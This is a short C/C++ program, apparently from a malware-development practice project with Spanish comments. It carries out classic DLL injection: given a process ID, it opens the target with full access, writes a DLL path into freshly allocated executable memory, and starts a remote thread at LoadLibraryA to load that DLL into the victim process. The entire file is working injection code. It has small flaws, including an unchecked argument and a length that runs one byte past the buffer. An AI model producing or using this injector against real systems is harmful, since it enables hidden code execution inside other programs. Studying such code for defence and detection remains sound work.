#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <tlhelp32.h>

char DLL[] = "C:\\Users\\pc\\source\\repos\\MalDev\\x64\\Debug\\Classic_DLL_Injection_1-DLL.dll";
unsigned int len = sizeof(DLL) + 1;

int main(int argc, char* argv[])
{
		// Proccess Handle
	HANDLE ph;
		// Remote Thread
	HANDLE rt;
		// Remote Buffer
	LPVOID rb;

		// Manejador a Kernel32 y páselo a GetProcAddress 
	HMODULE hKernel32 = GetModuleHandle((LPCWSTR)L"Kernel32");
	VOID*   lb = GetProcAddress(hKernel32, "LoadLibraryA");

		// Recibimos por parametro el PID 
	if (atoi(argv[1]) == 0)
	{
		printf("PID NOT FOUND :( exiting...\n");
		return -1;
	}

	printf("PID : %i", atoi(argv[1]));
	ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));

	rb = VirtualAllocEx(ph, NULL, len, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);

	WriteProcessMemory(ph, rb, DLL, len, NULL);

	rt = CreateRemoteThread(ph, NULL, 0, (LPTHREAD_START_ROUTINE)lb, rb, 0, NULL);

	CloseHandle(ph);

	return 0;
} 